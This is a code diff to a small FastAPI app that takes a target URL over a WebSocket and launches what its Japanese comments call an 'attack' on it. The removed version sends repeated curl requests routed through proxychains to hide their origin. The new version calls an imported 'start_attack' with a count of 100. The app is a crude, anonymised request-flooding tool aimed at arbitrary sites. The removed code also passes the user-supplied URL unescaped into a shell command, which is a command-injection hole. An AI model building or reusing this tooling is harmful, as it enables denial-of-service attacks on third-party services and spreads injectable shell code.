@@ -1,20 +1,9 @@
 from fastapi import FastAPI, WebSocket
 from fastapi.responses import HTMLResponse
 import asyncio
-import subprocess
+from attack import start_attack
 
 app = FastAPI()
-
-async def send_request(url):
-   
-    cmd = f"proxychains4 -q curl -I -L --max-time 2 {url}"
-    process = await asyncio.create_subprocess_shell(
-        cmd,
-        stdout=asyncio.subprocess.PIPE,
-        stderr=asyncio.subprocess.PIPE
-    )
-    stdout, stderr = await process.communicate()
-    return f"Status: {process.returncode} | Output: {stdout.decode()[:50]}..."
 
 @app.get("/")
 async def get():
@@ -25,9 +14,10 @@ async def get():
 async def websocket_endpoint(websocket: WebSocket):
     await websocket.accept()
     while True:
-        data = await websocket.receive_text() 
-        
-        for _ in range(10): 
-            result = await send_request(data)
-            await websocket.send_text(result)
-            await asyncio.sleep(0.5)
+        url = await websocket.receive_text()
+        await websocket.send_text(f"攻撃開始: {url}")
+        # 攻撃実行
+        results = await start_attack(url, count=100)
+        # 結果をログに返す
+        for res in results:
+            await websocket.send_text(res)
